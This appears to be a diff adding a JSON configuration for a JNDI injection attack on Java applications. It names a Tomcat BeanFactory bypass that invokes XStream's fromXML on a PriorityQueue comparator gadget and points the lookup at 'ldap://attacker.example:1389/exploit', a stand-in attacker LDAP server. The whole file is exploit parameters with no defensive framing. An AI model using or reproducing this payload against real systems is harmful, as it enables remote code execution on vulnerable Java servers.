@@ -1,0 +1,12 @@
+{
+    "attack_type": "jndi_factory",
+    "factory_class": "org.apache.naming.factory.BeanFactory",
+    "reference_class": "com.thoughtworks.xstream.XStream",
+    "factory_attrs": {
+        "forceString": "x=fromXML",
+        "x": "<java.util.PriorityQueue><comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'></comparator></java.util.PriorityQueue>"
+    },
+    "sink_type": "xstream_deser",
+    "protocol": "ldap",
+    "lookup_url": "ldap://attacker.example:1389/exploit"
+}
